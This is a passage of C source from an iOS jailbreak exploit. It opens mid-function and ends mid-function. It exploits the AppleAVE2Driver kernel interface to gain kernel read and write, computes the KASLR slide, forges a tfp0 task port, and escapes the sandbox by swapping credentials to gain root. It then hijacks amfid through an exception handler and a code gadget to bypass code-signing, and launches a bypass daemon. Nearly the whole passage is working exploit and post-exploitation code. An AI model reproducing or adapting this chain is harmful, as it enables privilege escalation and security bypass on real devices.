    
    *(uint32_t*)(inputmap_InitInfo + 13232) = 1;
    encode_client_normal(0);
    *(uint64_t*)(inputmap_InitInfo + 56) = 0;
    empty_kernel_40_mem(kObject_AppleAVE2Driver + 0x400 - 40);
    
    uint64_t last_v = 0;
    uint64_t kObject_clientbuf = 0;
    uint32_t howmany = 0;
    for(;;){
        kObject_clientbuf = temp_kernel_reading_categ3(kObject_AppleAVE2Driver + 0x400);
        kObject_clientbuf |= 0xffffffe000000000;
        (printf)("kObject_clientbuf_i: 0x%llx\n", kObject_clientbuf);
        if(last_v && (kObject_clientbuf > last_v)){
            if((kObject_clientbuf - last_v) == 0x2c000){
                if((uint16_t)kObject_clientbuf != 0x0000){
                    printf(" Found the right clientbuf! 0x%llx\n", kObject_clientbuf);
                    break;
                }
            }
        }
        if(last_v == 0){
            if((uint16_t)kObject_clientbuf != 0x0000){
                printf(" Found the right clientbuf! 0x%llx\n", kObject_clientbuf);
                break;
            }
        }
        last_v = kObject_clientbuf;
        if(add_new_client() == 1){
            // when client list is full
            printf2("client list is full.\n");
            for(int i=0; i<howmany; i++){
                remove_client();
            }
            last_v = 0;
            add_new_client();
            encode_client_normal(0);
            howmany = 1;
        }
        else{
            // when it's not full
            encode_client_normal(0);
            howmany ++;
        }
    }
    usleep(1000);
    
    *(uint32_t*)(inputmap_InitInfo + 4) = 99;
    *(uint32_t*)(inputmap_InitInfo + 4) = 99;
    *(uint32_t*)(inputmap_InitInfo + 4) = 99;
    uint64_t the_prev_clientbuf = temp_kernel_reading_categ3(kObject_clientbuf + 0x29b60);
    the_prev_clientbuf |= 0xffffffe000000000;
    printf("the_prev_clientbuf: 0x%llx\n", the_prev_clientbuf);
    
    *(uint32_t*)(inputmap_InitInfo + 4) = 99;
    *(uint32_t*)(inputmap_InitInfo + 4) = 99;
    *(uint32_t*)(inputmap_InitInfo + 4) = 99;
    uint64_t kObject_AppleAVE2UserClient = temp_kernel_reading_categ5(the_prev_clientbuf);
    kObject_AppleAVE2UserClient |= 0xffffffe000000000;
    printf("kObject_AppleAVE2UserClient: 0x%llx\n", kObject_AppleAVE2UserClient);
    
    printf2("Setting up new kernel r/w primitives...\n");
    
    for(int i=0; i<10; i++){prep_fake_clientbuf(kObject_AppleAVE2UserClient);}
    empty_kernel_40_mem(kObject_AppleAVE2Driver + 0x3DA);
    
    uint32_t surface_vtable = (uint32_t)KernelRead_8bytes(kObject_IOSurface);
    kaslr = surface_vtable - (uint32_t)HARDCODED_infoleak_addr;
    (printf)("kaslr: 0x%x\n", (uint32_t)kaslr);
    
    KernelWrite_8bytes(the_prev_clientbuf, kObject_AppleAVE2UserClient);
    
    our_proc_kAddr = find_proc_byPID(getpid());
    printf("found! our_proc: 0x%llx\n", our_proc_kAddr);
    our_task_kAddr = KernelRead_8bytes(our_proc_kAddr + OFFSET_bsd_info_task);
    printf("found! our_task: 0x%llx\n", our_task_kAddr);
    kernel_map_kAddr = KernelRead_8bytes(HARDCODED_kernel_map + kaslr);
    printf("kernel_map_kAddr: 0x%llx\n", kernel_map_kAddr);
    {
        // Acquire ipc_space_kernel_kAddr, later need it for form TFP0
        mach_port_t stored_ports[3] = {0};
        stored_ports[2] = IOSurfaceRootUserClient_ioconn;
        mach_ports_register(mach_task_self(), stored_ports, 3);
        uint64_t IOSurfaceRootUserClient_ioconn_port_kAddr = KernelRead_8bytes(our_task_kAddr + OFFSET_task_itk_registered + 0x10);
        ipc_space_kernel_kAddr = KernelRead_8bytes(IOSurfaceRootUserClient_ioconn_port_kAddr + offsetof(struct ipc_port, ip_receiver));
        bzero(stored_ports, sizeof(stored_ports));
        mach_ports_register(mach_task_self(), stored_ports, 3);
    }
    printf("ipc_space_kernel_kAddr: 0x%llx\n", ipc_space_kernel_kAddr);
    
    void safepatch_swap_unsandbox_and_root(uint64_t target_proc);
    safepatch_swap_unsandbox_and_root(our_proc_kAddr);
    
    pid_t sacrifice_task_pid = fork();
    if(sacrifice_task_pid == 0){
        while(1){
            sleep(999999);
        }
    }
    printf("sacrifice_task_pid: %d\n", sacrifice_task_pid);
    
    void safepatch_swap_spindump_cred(uint64_t target_proc); safepatch_swap_spindump_cred(our_proc_kAddr);
    uint32_t sacrifice_taskport = 0;
    task_for_pid(mach_task_self(), sacrifice_task_pid, &sacrifice_taskport);
    void safepatch_unswap_spindump_cred(uint64_t target_proc); safepatch_unswap_spindump_cred(our_proc_kAddr);
    
    uint64_t sacrifice_portStru = KernelLeak_portAddr(our_task_kAddr, sacrifice_taskport);
    uint64_t sacrifice_taskStru = KernelRead_8bytes(sacrifice_portStru + offsetof(struct ipc_port, ip_kobject));
    
    build_fake_task_stru_forTFP0((struct task*)sacrifice_taskStru);
    build_fake_ipc_port_stru((struct ipc_port*)sacrifice_portStru, sacrifice_taskStru);
    
    printf("fake tfp0 taskStru: 0x%llx\n", sacrifice_taskStru);
    printf("fake tfp0 portStru: 0x%llx\n", sacrifice_portStru);
    
    tfp0_port = sacrifice_taskport;
    tfp0_portStru = sacrifice_portStru;
    printf("tfp0_port: 0x%x\n", tfp0_port);
    {
        uint64_t retdata = 0;
        vm_size_t outsize = 0x8;
        int kk = vm_read_overwrite(tfp0_port, 0xfffffff007004000 + kaslr, 0x8, (vm_address_t)&retdata, &outsize);
        printf(" tfp0 test read: (%d)0x%x outdata: 0x%llx\n", kk, kk, retdata);
    }
    
    OFFSET_task_bsd_info = KernelUti_GenerateOffset(our_task_kAddr, our_proc_kAddr);
    
    uint64_t bsd_info = KernelRead_8bytes(sacrifice_taskStru + OFFSET_task_bsd_info);
    KernelWrite_4bytes(bsd_info + OFFSET_bsd_info_pid, (uint32_t)kaslr);;
    
    void safepatch_unswap_unsandbox_and_root(uint64_t target_proc);
    safepatch_unswap_unsandbox_and_root(our_proc_kAddr);
    
    // shutting down r/w pritmitives..
    KernelWrite_4bytes(kObject_AppleAVE2Driver + 0x400, (uint32_t)(kObject_clientbuf));
    for(int i=0; i<10; i++){clean_fake_clientbuf();}
    for(int i=0; i<7; i++){
        remove_client();
    }
    for(int i=0; i<howmany; i++){
        remove_client();
    }
    IOSurfaceRootUserClient_remove_surface_map(surface_ioconn, InitInfo_surfaceId);
    Send_notify_msg();
    
    extern void run_post_exp(void);
    run_post_exp();
    
    printf2("done\n");
    printf2(":)\n");
    
}

#pragma mark ---- Post-exp ---- Patch codesign

uint64_t amfid_OFFSET_MISValidate_symbol = 0; // for redirect code exec
uint64_t amfid_OFFSET_gadget = 0; // for throw invalid-addr-access exception

uint64_t binary_load_address(mach_port_t tp) {
    kern_return_t err;
    mach_msg_type_number_t region_count = VM_REGION_BASIC_INFO_COUNT_64;
    memory_object_name_t object_name = MACH_PORT_NULL; /* unused */
    mach_vm_size_t target_first_size = 0x1000;
    mach_vm_address_t target_first_addr = 0x0;
    struct vm_region_basic_info_64 region = {0};
    //printf("about to call mach_vm_region\n");
    extern kern_return_t mach_vm_region
    (
     vm_map_t target_task,
     mach_vm_address_t *address,
     mach_vm_size_t *size,
     vm_region_flavor_t flavor,
     vm_region_info_t info,
     mach_msg_type_number_t *infoCnt,
     mach_port_t *object_name
     );
    err = mach_vm_region(tp,
                         &target_first_addr,
                         &target_first_size,
                         VM_REGION_BASIC_INFO_64,
                         (vm_region_info_t)&region,
                         &region_count,
                         &object_name);
    
    if (err != KERN_SUCCESS) {
        //printf("failed to get the region err: %d\n", err);
        return 0;
    }
    //printf("got base address\n");
    
    return target_first_addr;
}

uint32_t TaskRead_4bytes(mach_port_t task, uint64_t rAddr){
    uint32_t retdata = 0;
    vm_size_t outsize = 0x4;
    vm_read_overwrite(task, rAddr, 0x4, (vm_address_t)&retdata, &outsize);
    return retdata;
}

uint64_t TaskRead_8bytes(mach_port_t task, uint64_t rAddr){
    uint64_t retdata = 0;
    vm_size_t outsize = 0x8;
    vm_read_overwrite(task, rAddr, 0x8, (vm_address_t)&retdata, &outsize);
    return retdata;
}

void TaskWrite_1byte(mach_port_t task, uint64_t wAddr, uint8_t wData){
    vm_write(task, wAddr, (vm_offset_t)&wData, 0x1);
}

void TaskWrite_4bytes(mach_port_t task, uint64_t wAddr, uint32_t wData){
    vm_write(task, wAddr, (vm_offset_t)&wData, 0x4);
}

void TaskWrite_8bytes(mach_port_t task, uint64_t wAddr, uint64_t wData){
    vm_write(task, wAddr, (vm_offset_t)&wData, 0x8);
}

void TaskWrite_anySize(mach_port_t task, uint64_t wAddr, char *inputbuf, uint32_t inputbuf_len){
    vm_write(task, wAddr, (vm_offset_t)inputbuf, inputbuf_len);
}

uint64_t TaskAllocate(mach_port_t task, size_t len){
    vm_address_t return_addr = 0;
    vm_allocate(task, (vm_address_t*)&return_addr, len, VM_FLAGS_ANYWHERE);
    return return_addr;
}

void TaskDeallocate(mach_port_t task, uint64_t addr, size_t len){
    vm_deallocate(task, addr, len);
}

void* rmem(mach_port_t tp, uint64_t addr, uint64_t len) {
    kern_return_t err;
    uint8_t* outbuf = malloc(len);
    vm_size_t outsize = len;
    
    err = vm_read_overwrite(tp, addr, len, (vm_address_t)outbuf, &outsize);
    if (err != KERN_SUCCESS) {
        (printf)("read failed\n");
        return NULL;
    }
    
    return outbuf;
}

#pragma pack(4)
typedef struct {
    mach_msg_header_t Head;
    mach_msg_body_t msgh_body;
    mach_msg_port_descriptor_t thread;
    mach_msg_port_descriptor_t task;
    NDR_record_t NDR;
} exception_raise_request; // the bits we need at least

typedef struct {
    mach_msg_header_t Head;
    NDR_record_t NDR;
    kern_return_t RetCode;
} exception_raise_reply;
#pragma pack()

uint64_t amfid_base = 0;
mach_port_t amfid_exception_port = MACH_PORT_NULL;

// --- Generate CDHash

typedef CF_OPTIONS(uint32_t, SecCSFlags) {
    kSecCSDefaultFlags = 0,                    /* no particular flags (default behavior) */
    kSecCSConsiderExpiration = 1 << 31,        /* consider expired certificates invalid */
};
typedef void *SecStaticCodeRef;
OSStatus SecStaticCodeCreateWithPathAndAttributes(CFURLRef path, SecCSFlags flags, CFDictionaryRef attributes, SecStaticCodeRef  _Nullable *staticCode);
OSStatus SecCodeCopySigningInformation(SecStaticCodeRef code, SecCSFlags flags, CFDictionaryRef  _Nullable *information);
CFStringRef (*_SecCopyErrorMessageString)(OSStatus status, void * __nullable reserved) = NULL;

enum cdHashType {
    cdHashTypeSHA1 = 1,
    cdHashTypeSHA256 = 2
};

static char *cdHashName[3] = {NULL, "SHA1", "SHA256"};

static enum cdHashType requiredHash = cdHashTypeSHA256;
#define TRUST_CDHASH_LEN (20)

const void *CFArrayGetValueAtIndex_prevenOverFlow(CFArrayRef theArray, CFIndex idx){
    CFIndex arrCnt = CFArrayGetCount(theArray);
    if(idx >= arrCnt){
        idx = arrCnt - 1;
    }
    return CFArrayGetValueAtIndex(theArray, idx);
}

void *cdhashFor(char *file){
    SecStaticCodeRef staticCode = NULL;
    
    CFStringRef cfstr_path = CFStringCreateWithCString(kCFAllocatorDefault, file, kCFStringEncodingUTF8);
    CFURLRef cfurl = CFURLCreateWithFileSystemPath(kCFAllocatorDefault, cfstr_path, kCFURLPOSIXPathStyle, false);
    CFRelease(cfstr_path);
    OSStatus result = SecStaticCodeCreateWithPathAndAttributes(cfurl, kSecCSDefaultFlags, NULL, &staticCode);
    CFRelease(cfurl);
    if (result != 0) {
        if (_SecCopyErrorMessageString != NULL) {
            CFStringRef error = _SecCopyErrorMessageString(result, NULL);
            
            (printf)("Unable to generate cdhash for %s: %s\n", file, CFStringGetCStringPtr(error, kCFStringEncodingUTF8));
            CFRelease(error);
        } else {
            (printf)("Unable to generate cdhash for %s: %d\n", file, result);
        }
        return nil;
    }
    
    CFDictionaryRef signinginfo;
    result = SecCodeCopySigningInformation(staticCode, kSecCSDefaultFlags, &signinginfo);
    CFRelease(staticCode);
    if (result != 0) {
        (printf)("Unable to copy cdhash info for %s\n", file);
        return NULL;
    }
    
    CFArrayRef cdhashes = CFDictionaryGetValue(signinginfo, CFSTR("cdhashes"));
    CFArrayRef algos = CFDictionaryGetValue(signinginfo, CFSTR("digest-algorithms"));
    int algoIndex = -1;
    CFNumberRef nn = CFArrayGetValueAtIndex_prevenOverFlow(algos, requiredHash);
    if(nn){
        CFNumberGetValue(nn, kCFNumberIntType, &algoIndex);
    }
    
    //(printf)("cdhashesCnt: %d\n", CFArrayGetCount(cdhashes));
    //(printf)("algosCnt: %d\n", CFArrayGetCount(algos));
    
    CFDataRef cdhash = NULL;
    if (cdhashes == NULL) {
        (printf)("%s: no cdhashes\n", file);
    } else if (algos == NULL) {
        (printf)("%s: no algos\n", file);
    } else if (algoIndex == -1) {
        (printf)("%s: does not have %s hash", cdHashName[requiredHash], file);
    } else {
        cdhash = CFArrayGetValueAtIndex_prevenOverFlow(cdhashes, requiredHash);
        if (cdhash == NULL) {
            (printf)("%s: missing %s cdhash entry\n", file, cdHashName[requiredHash]);
        }
    }
    if(cdhash == NULL){
        CFRelease(signinginfo);
        return NULL;
    }
    
    //(printf)("cdhash len: %d\n", CFDataGetLength(cdhash));
    char *rv = calloc(1, 20);
    memcpy(rv, CFDataGetBytePtr(cdhash), 20);
    CFRelease(signinginfo);
    return rv;
}

void *Build_ValidateSignature_dic(uint8_t *input_cdHash, size_t *out_size, uint64_t shadowp){
    // Build a self-contained, remote-address-adapted CFDictionary instance
    
    CFDataRef _cfhash_cfdata = CFDataCreate(kCFAllocatorDefault, input_cdHash, 20);
    void *cfhash_cfdata = (void*)_cfhash_cfdata;
    const char *iomatch_key = "CdHash";
    
    size_t key_len = strlen(iomatch_key) + 0x11;
    key_len = (~0xF) & (key_len + 0xF);
    size_t value_len = 0x60; // size of self-contained CFData instance
    value_len = (~0xF) & (value_len + 0xF);
    size_t total_len = key_len + value_len + 0x20;
    
    *out_size = total_len;
    void *writep = calloc(1, total_len);
    
    char *realCFString = (char*)CFStringCreateWithCString(0, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", kCFStringEncodingUTF8);
    char *keys[] = {realCFString};
    char *values[] = {realCFString};
    char *realCFDic = (char*)CFDictionaryCreate(0, (const void**)keys, (const void**)values, 1, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFRetain(realCFDic); // Pump in some extra lifes
    CFRetain(realCFDic);
    CFRetain(realCFDic);
    CFRetain(realCFDic);
    memcpy(writep, realCFDic, 0x20);
    
    writep = writep + total_len - value_len;
    shadowp = shadowp + total_len - value_len;
    uint64_t value = shadowp;
    memcpy(writep, cfhash_cfdata, 0x60);
    CFRelease(cfhash_cfdata);
    
    writep -= key_len;
    shadowp -= key_len;
    uint64_t key = shadowp;
    *(uint64_t*)(writep) = *(uint64_t*)realCFString;
    *(uint64_t*)(writep + 8) = *(uint64_t*)(realCFString + 8);
    *(uint8_t*)(writep + 16) = strlen(iomatch_key);
    memcpy(writep + 17, iomatch_key, strlen(iomatch_key));
    
    writep -= 0x20;
    shadowp -= 0x20;
    *(uint64_t*)(writep + 0x8) = value;
    *(uint64_t*)(writep + 0x10) = key;
    
    CFRelease(realCFDic);
    CFRelease(realCFDic);
    CFRelease(realCFDic);
    CFRelease(realCFDic);
    CFRelease(realCFDic);
    CFRelease(realCFString);
    
    return writep;
}

uint64_t reserved_mem_in_amfid = 0;
uint64_t update_cdhash_in_amfid = 0;
uint64_t update_retainCnt_in_amfid = 0;
void* amfid_exception_handler(void* arg){
    uint32_t size = 0x1000;
    mach_msg_header_t* msg = malloc(size);
    for(;;){
        kern_return_t err;
        //printf("calling mach_msg to receive exception message from amfid\n");
        err = mach_msg(msg,
                       MACH_RCV_MSG | MACH_MSG_TIMEOUT_NONE, // no timeout
                       0,
                       size,
                       amfid_exception_port,
                       0,
                       0);
        if (err != KERN_SUCCESS){
            //printf("error receiving on exception port: %s\n", mach_error_string(err));
        } else {
            //(printf)("got exception message from amfid!\n");
            
            exception_raise_request* req = (exception_raise_request*)msg;
            
            mach_port_t thread_port = req->thread.name;
            mach_port_t task_port = req->task.name;
            _STRUCT_ARM_THREAD_STATE64 old_state = {0};
            mach_msg_type_number_t old_stateCnt = sizeof(old_state)/4;
            err = thread_get_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&old_state, &old_stateCnt);
            if (err != KERN_SUCCESS){
                //printf("error getting thread state: %s\n", mach_error_string(err));
                continue;
            }
            
            _STRUCT_ARM_THREAD_STATE64 new_state;
            memcpy(&new_state, &old_state, sizeof(_STRUCT_ARM_THREAD_STATE64));
            
            // get the filename pointed to by X23 (or x24 after iOS 13.5)
            extern bool check_if_amfid_has_entitParser(void);
            char* filename = rmem(task_port, check_if_amfid_has_entitParser()?new_state.__x[24]:new_state.__x[23], 1024);
            //(printf)("got filename for amfid request: %s\n", filename);
            
#define TRUST_CDHASH_LEN (20)
            
            uint8_t *cdhash = cdhashFor(filename);
            if(cdhash){
                uint32_t offset_to_store = 0x50;
                if(reserved_mem_in_amfid == 0){
                    // Allocate a page of memory in amfid, where we stored cfdic for bypass signature valid
                    vm_allocate(task_port, (vm_address_t*)&reserved_mem_in_amfid, 0x4000, VM_FLAGS_ANYWHERE);
                    //(printf)("reserved_mem_in_amfid: 0x%llx\n", reserved_mem_in_amfid);
                    
                    TaskWrite_8bytes(task_port, reserved_mem_in_amfid + 0x28, 0);
                    
                    size_t out_size = 0;
                    char *fakedic = Build_ValidateSignature_dic(cdhash, &out_size, reserved_mem_in_amfid + offset_to_store);
                    TaskWrite_anySize(task_port, reserved_mem_in_amfid + offset_to_store, fakedic, (uint32_t)out_size);
                    update_cdhash_in_amfid = reserved_mem_in_amfid + offset_to_store + 0x70; // To update cdhash in the same cfdic
                    update_retainCnt_in_amfid = *(uint64_t*)(fakedic); // To keep dic away from being release
                    free(fakedic);
                }
                else{
                    if(cdhash){
                        for (int i = 0; i < TRUST_CDHASH_LEN; i++){
                            TaskWrite_1byte(task_port, update_cdhash_in_amfid + i, cdhash[i]);
                        }
                        TaskWrite_8bytes(task_port, reserved_mem_in_amfid + offset_to_store, update_retainCnt_in_amfid);
                    }
                }
                free(cdhash);
            }
            
            TaskWrite_8bytes(task_port, old_state.__x[2], reserved_mem_in_amfid + 0x50);
            new_state.__x[8] = reserved_mem_in_amfid; // For the next encouter instr: LDR  X0, [X8,#0x28] <- Clear out X0 as success return
            
            
            // set the new thread state:
            err = thread_set_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&new_state, sizeof(new_state)/4);
            
            exception_raise_reply reply = {0};
            
            reply.Head.msgh_bits = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(req->Head.msgh_bits), 0);
            reply.Head.msgh_size = sizeof(reply);
            reply.Head.msgh_remote_port = req->Head.msgh_remote_port;
            reply.Head.msgh_local_port = MACH_PORT_NULL;
            reply.Head.msgh_id = req->Head.msgh_id + 100;
            
            reply.NDR = req->NDR;
            reply.RetCode = KERN_SUCCESS;
            
            err = mach_msg(&reply.Head,
                           MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                           (mach_msg_size_t)sizeof(reply),
                           0,
                           MACH_PORT_NULL,
                           MACH_MSG_TIMEOUT_NONE,
                           MACH_PORT_NULL);
            
            mach_port_deallocate(mach_task_self(), thread_port);
            mach_port_deallocate(mach_task_self(), task_port);
        }
    }
    return NULL;
}

void set_exception_handler(mach_port_t amfid_task_port){
    // allocate a port to receive exceptions on:
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amfid_exception_port);
    mach_port_insert_right(mach_task_self(), amfid_exception_port, amfid_exception_port, MACH_MSG_TYPE_MAKE_SEND);
    
    kern_return_t err = task_set_exception_ports(amfid_task_port,
                                                 EXC_MASK_ALL,
                                                 amfid_exception_port,
                                                 EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES,  // we want to receive a catch_exception_raise message with the thread port for the crashing thread
                                                 ARM_THREAD_STATE64);
    
    if (err != KERN_SUCCESS){
        (printf)("error setting amfid exception port: %s\n", mach_error_string(err));
    } else {
        (printf)("set amfid exception port: succeed!\n");
    }
    
    // spin up a thread to handle exceptions:
    pthread_t exception_thread;
    pthread_create(&exception_thread, &pth_commAttr, amfid_exception_handler, NULL);
}

void patch_amfid(pid_t amfid_pid){
    uint32_t amfid_task = 0;
    task_for_pid(mach_task_self(), amfid_pid, &amfid_task);
    (printf)("amfid_task: 0x%x\n", amfid_task);
    
    set_exception_handler(amfid_task);
    
    amfid_base = binary_load_address(amfid_task);
    (printf)("amfid_base: 0x%llx\n", amfid_base);
    
    vm_protect(amfid_task, mach_vm_trunc_page(amfid_base + amfid_OFFSET_MISValidate_symbol), 0x4000, false, VM_PROT_READ|VM_PROT_WRITE);
#if __arm64e__
    extern uint64_t PACSupport_pacia(uint64_t code_ptr, uint64_t modifier);
    uint64_t redirect_pc = PACSupport_pacia(amfid_base + amfid_OFFSET_gadget, amfid_base + amfid_OFFSET_MISValidate_symbol);
#else
    uint64_t redirect_pc = amfid_base + amfid_OFFSET_gadget;
#endif
    TaskWrite_8bytes(amfid_task, amfid_base + amfid_OFFSET_MISValidate_symbol, redirect_pc);
}

uint64_t find_amfid_OFFSET_MISValidate_symbol(uint8_t *amfid_macho){
    
    uint32_t MISValidate_symIndex = 0;
    struct mach_header_64 *mh = (struct mach_header_64*)amfid_macho;
    const uint32_t cmd_count = mh->ncmds;
    struct load_command *cmds = (struct load_command*)(mh + 1);
    struct load_command* cmd = cmds;
    for (uint32_t i = 0; i < cmd_count; ++i){
        switch (cmd->cmd) {
            case LC_SYMTAB:{
                struct symtab_command *sym_cmd = (struct symtab_command*)cmd;
                uint32_t symoff = sym_cmd->symoff;
                uint32_t nsyms = sym_cmd->nsyms;
                uint32_t stroff = sym_cmd->stroff;
                
                for(int i =0;i<nsyms;i++){
                    struct nlist_64 *nn = (void*)((char*)mh+symoff+i*sizeof(struct nlist_64));
                    char *def_str = NULL;
                    if(nn->n_type==0x1){
                        // 0x1 indicates external function
                        def_str = (char*)mh+(uint32_t)nn->n_un.n_strx + stroff;
                        if(!strcmp(def_str, "_MISValidateSignatureAndCopyInfo")){
                            break;
                        }
                    }
                    if(i!=0 && i!=1){ // Two at beginning are local symbols, they don't count
                        MISValidate_symIndex++;
                    }
                }
            }
                break;
        }
        cmd = (struct load_command*)((char*)cmd + cmd->cmdsize);
    }
    
    if(MISValidate_symIndex == 0){
        printf2("Error in find_amfid_OFFSET_MISValidate_symbol(): MISValidate_symIndex == 0\n");
        exit(1);
    }
    
    const struct section_64 *sect_info = NULL;
    if(check_if_its_PAC_device()){
        const char *_segment = "__DATA_CONST", *_segment2 = "__DATA", *_section = "__auth_got";
        // _segment for iOS 13, _segment2 for <= iOS 12
        sect_info = getsectbynamefromheader_64((const struct mach_header_64 *)amfid_macho, _segment, _section);
        if(!sect_info)
            sect_info = getsectbynamefromheader_64((const struct mach_header_64 *)amfid_macho, _segment2, _section);
    }else{
        const char *_segment = "__DATA", *_section = "__la_symbol_ptr";
        sect_info = getsectbynamefromheader_64((const struct mach_header_64 *)amfid_macho, _segment, _section);
    }
    
    if(!sect_info){
        printf2("Error in find_amfid_OFFSET_MISValidate_symbol(): if(!sect_info)\n");
        exit(1);
    }
    
    return sect_info->offset + (MISValidate_symIndex * 0x8);
}

uint64_t find_amfid_OFFSET_gadget(uint8_t *amfid_macho){
    const char *_segment = "__TEXT", *_section = "__text";
    const struct section_64 *sect_info = getsectbynamefromheader_64((const struct mach_header_64 *)amfid_macho, _segment, _section);
    if(!sect_info){
        printf2("Error in find_amfid_OFFSET_gadget(): if(!sect_info)\n");
        exit(1);
    }
    unsigned long sect_size = 0;
    uint64_t sect_data = (uint64_t)getsectiondata((const struct mach_header_64 *)amfid_macho, _segment, _section, &sect_size);
    
    char _bytes_gadget[] = {
        0x08, 0x29, 0x09, 0x9B, // madd    x8, x8, x9, x10
        0x00, 0x15, 0x40, 0xF9, // ldr     x0, [x8, #0x28]
        0xC0, 0x03, 0x5F, 0xD6, // ret
    };
    char _bytes_gadget2[] = {
        0x08, 0x25, 0x2A, 0x9B, // smaddl    x8, w8, w10, x9
        0x00, 0x15, 0x40, 0xF9, // ldr     x0, [x8, #0x28]
        0xC0, 0x03, 0x5F, 0xD6, // ret
    };
    
    uint64_t find_gadget = (uint64_t)memmem((void*)sect_data, sect_size, _bytes_gadget, sizeof(_bytes_gadget));
    if(!find_gadget)
        find_gadget = (uint64_t)memmem((void*)sect_data, sect_size, _bytes_gadget2, sizeof(_bytes_gadget2));
    if(!find_gadget){
        printf2("Error in find_amfid_OFFSET_gadget(): if(!find_gadget)\n");
        exit(1);
    }
    
    return (find_gadget - sect_data) + sect_info->offset;
}

size_t amfid_fsize = 0;
uint8_t *map_file_to_mem(const char *path){
    
    struct stat fstat = {0};
    stat(path, &fstat);
    amfid_fsize = fstat.st_size;
    
    int fd = open(path, O_RDONLY);
    uint8_t *mapping_mem = mmap(NULL, mach_vm_round_page(amfid_fsize), PROT_READ, MAP_SHARED, fd, 0);
    if((int)mapping_mem == -1){
        printf2("Error in map_file_to_mem(): mmap() == -1\n");
        exit(1);
    }
    return mapping_mem;
}

void patch_codesign(){
    
    printf2("patch_codesign in progress..\n");
    
    const char *amfid_bypassd_path = "/private/var/containers/Bundle/jb_resources/amfid_bypassd";
    if(look_for_proc(amfid_bypassd_path)){
        printf2("amfid_bypassd already running\n");
        return;
    }
    
    safepatch_swap_containermanagerd_cred(our_proc_kAddr);
    remove(amfid_bypassd_path);unlink(amfid_bypassd_path);
    if(access(amfid_bypassd_path, F_OK)){
        mkdir("/private/var/containers/Bundle/jb_resources", 0777);
        copyfile(Build_resource_path("/jb_resources/amfid_bypassd"), amfid_bypassd_path);
        chown(amfid_bypassd_path, 0, 0);
        chmod(amfid_bypassd_path, 0755);
    }
    safepatch_unswap_containermanagerd_cred(our_proc_kAddr);
    
    uint8_t *amfid_fdata = map_file_to_mem("/usr/libexec/amfid");
    amfid_OFFSET_MISValidate_symbol = find_amfid_OFFSET_MISValidate_symbol(amfid_fdata);
    printf("amfid_OFFSET_MISValidate_symbol: 0x%llx\n", amfid_OFFSET_MISValidate_symbol);
    amfid_OFFSET_gadget = find_amfid_OFFSET_gadget(amfid_fdata);
    printf("amfid_OFFSET_gadget: 0x%llx\n", amfid_OFFSET_gadget);
    munmap(amfid_fdata, amfid_fsize);
    
    safepatch_swap_spindump_cred(our_proc_kAddr);
    pid_t amfid_pid = look_for_proc("/usr/libexec/amfid");
    patch_amfid(amfid_pid);
    safepatch_unswap_spindump_cred(our_proc_kAddr);
    
    
    pid_t amfid_bypassd_pid = 0;
    if(fork() == 0){
        daemon(1, 1);
        close(STDIN_FILENO);
        close(STDOUT_FILENO);
        close(STDERR_FILENO);
        const char *argv[] = {amfid_bypassd_path, NULL};
        execvp(argv[0], (char*const*)argv);
        exit(1);
    }
    while(!(amfid_bypassd_pid = look_for_proc(amfid_bypassd_path))){}
    (printf)("amfid_bypassd_pid: %d\n", amfid_bypassd_pid);
    uint64_t target_proc = find_proc_byPID(amfid_bypassd_pid);
    uint64_t target_task = KernelRead_8bytes(target_proc + OFFSET_bsd_info_task);
    patch_TF_PLATFORM(target_task);
    printf2("amfid_bypassd took off\n");
}

#pragma mark ---- Post-exp ---- Copy Jailbreak Resources

void check_file_type_and_give_em_permission(char *file_path){
    uint32_t HeaderMagic32 = 0xFEEDFACE; // MH_MAGIC
    uint32_t HeaderMagic32Swapped = 0xCEFAEDFE; // MH_CIGAM
    uint32_t HeaderMagic64 = 0xFEEDFACF; // MH_MAGIC_64
    uint32_t HeaderMagic64Swapped = 0xCFFAEDFE; // MH_CIGAM_64
    uint32_t UniversalMagic = 0xCAFEBABE; // FAT_MAGIC
    uint32_t UniversalMagicSwapped = 0xBEBAFECA; // FAT_CIGAM
    
    struct stat fstat = {0};
    if(stat(file_path, &fstat)){
        return;
    }
    if(fstat.st_size < (20))
        return;
    
    int fd = open(file_path, O_RDONLY);
    if(fd){
        uint32_t *file_head4bytes = mmap(NULL, PAGE_SIZE, PROT_READ, MAP_SHARED, fd, 0);
        if((int)(file_head4bytes) == -1){
            close(fd);
            return;
        }
        if((*file_head4bytes == HeaderMagic32) ||
           (*file_head4bytes == HeaderMagic32Swapped) ||
           (*file_head4bytes == HeaderMagic64) ||
           (*file_head4bytes == HeaderMagic64Swapped) ||
           (*file_head4bytes == UniversalMagic) ||
           (*file_head4bytes == UniversalMagicSwapped) ||
           !strncmp((char*)file_head4bytes, "#!", 2)
           ){
            chown(file_path, 0, 0);
            chmod(file_path, 0755);
        }
        munmap(file_head4bytes, PAGE_SIZE);
        close(fd);
    }
}

void alter_exec_perm_in_dir(const char *name, int i_deep){
    DIR *dir;
    struct dirent *entry;
    
    if (!(dir = opendir(name))){
        return;
    }
    
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            char path[1024];
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
                continue;
            if(entry->d_name[0] == '.')
                continue;
            snprintf(path, sizeof(path), "%s/%s", name, entry->d_name);
            
            alter_exec_perm_in_dir(path, i_deep+1);
        } else {
            char path[1024];
            snprintf(path, sizeof(path), "%s/%s", name, entry->d_name);
            
            check_file_type_and_give_em_permission(path);
        }
    }
    closedir(dir);
}

#include <ifaddrs.h>
#include <net/if.h>
#include <arpa/inet.h>

void display_ip_address(){
    struct ifaddrs *interfaces = NULL;
    struct ifaddrs *temp_addr = NULL;
    if(getifaddrs(&interfaces) == 0){
        temp_addr = interfaces;
        while(temp_addr != NULL) {
            if(temp_addr->ifa_addr->sa_family == AF_INET) {
                
                printf("    %s: ", temp_addr->ifa_name);
                char *ip_addr = inet_ntoa(((struct sockaddr_in *)temp_addr->ifa_addr)->sin_addr);
                printf("    %s\n", ip_addr);
            }
            temp_addr = temp_addr->ifa_next;
        }
